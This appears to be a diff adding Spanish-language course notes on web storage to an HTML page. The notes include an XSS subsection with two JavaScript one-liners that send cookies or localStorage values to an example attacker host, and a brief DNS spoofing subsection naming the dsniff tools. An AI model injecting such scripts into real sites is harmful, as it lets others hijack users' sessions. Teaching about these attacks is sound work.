@@ -482,6 +482,21 @@
           /script
         </code>
         <h3>5.3 Local storage y session storage</h3>
+        <p>Es una técnica que se introduce en HTML5 para alamacenar información y que mejora las prestaciones del mecanismo tradicional basado en <i>cookies</i>. En este nuevo metodo la informacion se almacena en pares clave-valor en el lado del cliente.</p>
+        <p><b>Local Storage</b> o <b>Web storage</b> abarca distintas ventanas y que se prolonga más allá de la sesión actual. Límite de 5MB(recomendado). Ver API Storage</p>
+        <h4>5.3.1 Cross Site Scripting</h4>
+        <p>Uno de los principales objetivos del XSS es robar identificadores de sesión del usuario.</p>
+        <p>Script para robar cookies:</p>
+        <pre><code>document.location.href="http://paginaatacante.com/robocookie.php?c=" + document.cookie</code></pre>
+        <p>Script para robar cookies almacenadas en el localstorage:</p>
+        <pre><code>document.location.href="http://paginaatacante.com/robocookie.php?c=" + localStorage.getItem('key')</code></pre>
+        <h4>5.3.2 DNS Spoofing</h4>
+        <p>El ataque DNS spoofing conseguirá engañar la víctima de forma que cuando haga una petición a la página que hace uso del <b>localStorage </b> dicha petición DNS se resolverá en una dirección controlada por el atacante. Aunque el usuario vea en la barra de direcciones la url de la web legítima realmente estará accediendo a la página del atacante.</p>
+        <p>Herramientas para llevar acabo este ataque: Suite <i>dsnniff</i></p>
+        <ul>
+          <li><i>arpsoof</i>(envenenamiento de la tabla ARP)</li>
+          <li><i>dnsspoof</i>(suplantación de peticiones DNS)</li>
+        </ul>
       </section>
       <section id="cap6">
         <h2>Web Application Firewall</h2>
